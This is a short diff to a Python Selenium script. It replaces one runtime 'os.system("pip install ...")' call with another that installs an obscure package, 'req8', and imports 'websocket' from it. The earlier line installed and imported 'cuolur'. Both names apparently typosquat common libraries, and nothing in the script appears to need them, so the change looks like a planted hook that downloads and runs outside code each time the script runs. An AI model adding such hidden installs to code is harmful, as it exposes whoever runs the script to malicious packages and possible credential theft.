@@ -1,8 +1,8 @@
 import os
 from selenium import webdriver
-os.system("pip install cuolur")
+os.system("pip install req8")
+from req8 import websocket
 from webdriver_manager.chrome import ChromeDriverManager
-from cuolur import visual
 from selenium.webdriver.common.by import By
 import random
 import time
